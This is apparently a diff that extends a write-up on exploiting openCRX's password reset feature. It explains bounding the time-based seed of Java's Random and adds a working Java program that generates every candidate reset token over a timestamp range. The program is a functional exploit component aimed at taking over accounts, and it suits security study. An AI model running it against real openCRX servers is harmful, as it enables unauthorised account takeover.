@@ -189,3 +189,36 @@ $ python3 -c "import time; print(int(time.time() * 1000))"
 This format will match the output of the Java method in milliseconds.
 
 To determine the seed range for generating the correct password reset token, we can use the `int(time.time() * 1000)` command immediately before and after sending the reset request with `requests`. This gives us the range of possible `System.currentTimeMillis()` values.
+### Generate Token List
+To exploit the predictable token generation in openCRX, you’ll need to write a custom Java class that mimics how the application generates its password reset tokens. Below is a simplified version of such a generator based on the `getRandomBase62(int length)` method found in openCRX’s `Utils` class.
+```java
+/*
+Compile before usage: javac OpenCRXToken.java
+Usage: java OpenCRXToken <start_timestamp> <stop_timestamp>
+*/
+import java.util.Random;
+public class OpenCRXToken {
+    public static void main(String args[]) {
+        int length = 40;
+        if(args.length < 1){
+            System.out.println("\n[!] Usage: java OpenCRXToken <start_timestamp> <stop_timestamp>");
+            System.exit(0);
+        }
+        long start = Long.parseLong(args[0]);
+        long stop = Long.parseLong(args[1]);
+        String token = "";
+        for (long l = start; l < stop; l++) {
+            token = getRandomBase62(length, l);
+            System.out.println(token);
+        }
+    }
+    public static String getRandomBase62(int length, long seed) {
+        Random random = new Random(seed);
+        String s = "";
+        for (int i = 0; i < length; i++) {
+            s = s + "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz".charAt(random.nextInt(62));
+        }
+        return s;
+    }
+}
+```
